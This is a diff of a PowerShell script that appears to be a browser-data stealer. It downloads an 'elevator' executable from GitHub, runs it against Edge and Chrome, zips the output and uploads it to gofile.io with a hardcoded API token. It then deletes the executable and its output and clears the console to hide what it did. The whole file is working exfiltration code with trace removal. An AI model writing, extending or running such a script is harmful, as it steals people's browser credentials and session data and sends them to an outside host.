@@ -1,82 +1,59 @@
 function Upload-direToGofile {
     param (
-        [string]$FilePath,
+        [string]$Path,
         [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK",
         [string]$newFolderId
     )
-    try {
-        
- 
-
-            if (Test-Path $DirectoryPath) {
-        $zipPath = "$env:TEMP\upload_package.zip"
+    
+      try{ 
+            if (Test-Path $Path) {
+        $zipPath = "C:\ProgramX64\extentions\upload_package.zip"
         
        
         if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+        
 
-        Compress-Archive -Path "$DirectoryPath\*" -DestinationPath $zipPath -Force
+        Compress-Archive -Path "$Path\*" -DestinationPath $zipPath -Force
         $uploadUri = "https://store1.gofile.io/uploadFile"
         
         curl.exe -F "file=@$zipPath" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
-            cls
+            
         Remove-Item $zipPath -Force
-    }
-        cls
+    
+        
                 Start-Sleep -Seconds 1  
             
         }
-   
-    catch {cls
-
-    }
+   }
+    catch {Write-Host ""}
 }
 
-function Upload-FilesToGofile {
-    param (
-        [string]$FilePath,
-        [string]$ApiKey = "hV7e6NmlToS8RPAEiEed3KhiKcIlUkWK",
-        [string]$newFolderId
-    )
-    try {
-        
- 
 
-            if (Test-Path $FilePath) {
-                # In PowerShell 7+, use -Form. In 5.1, we use this trick:
-                $uploadUri = "https://store1.gofile.io/uploadFile"
-                
-                curl.exe -F "file=@$FilePath" -F "token=$ApiKey" -F "folderId=$newFolderId" $uploadUri
-cls
-                Start-Sleep -Seconds 1
-                
-            }
-        }
-   
-    catch {cls
-
-    }
-}
 
 $url = "https://raw.githubusercontent.com/wajih8/wpla_wajih/refs/heads/main/public/elevator_x64.exe"
 
 $outPath = "C:\ProgramX64\extentions\evab.exe"
-
+if(!(Test-Path -Path "C:\ProgramX64\extentions\out")){
+    mkdir "C:\ProgramX64\extentions\out"
+    cls
+}
 
 if(!(Test-Path -Path $outPath)) {
 Invoke-WebRequest -Uri $url -OutFile $outPath}
-Start-Sleep -Seconds 5
-C:\ProgramX64\extentions\evab.exe -o "C:\ProgramX64\extentions\" edge > C:\ProgramX64\extentions\a.dat
-Start-Sleep -Seconds 1
-cls
-
-Upload-FilesToGofile -FilePath "C:\ProgramX64\extentions\a.dat" -newFolderId "a14858bf-8246-4272-8486-aac51f194cea"
-cls
-Upload-direToGofile -FilePath "C:\ProgramX64\extentions\Edge" -newFolderId "a14858bf-8246-4272-8486-aac51f194cea"
-cls
+Start-Sleep -Milliseconds 200
+C:\ProgramX64\extentions\evab.exe -o "C:\ProgramX64\extentions\out" edge > C:\ProgramX64\extentions\out\a.dat
+C:\ProgramX64\extentions\evab.exe -o "C:\ProgramX64\extentions\out" chrome > C:\ProgramX64\extentions\out\b.dat
+Start-Sleep -Milliseconds 200
+Remove-Item -Path "C:\ProgramX64\extentions\evab.exe" -Force
 
 
-Start-Sleep -Seconds 1
-Remove-Item -Path "C:\ProgramX64\extentions\Edge" -Recurse -Force
-Remove-Item -Path "C:\ProgramX64\extentions\a.dat" -Force
+Upload-direToGofile -Path "C:\ProgramX64\extentions\out" -newFolderId "95adad47-12b6-47e0-bc26-c895ea8bacb1"
+
 cls
-Start-Sleep -Seconds 1
+
+Start-Sleep -Milliseconds 20
+Remove-Item -Path "C:\ProgramX64\extentions\out" -Recurse -Force
+
+
+
+
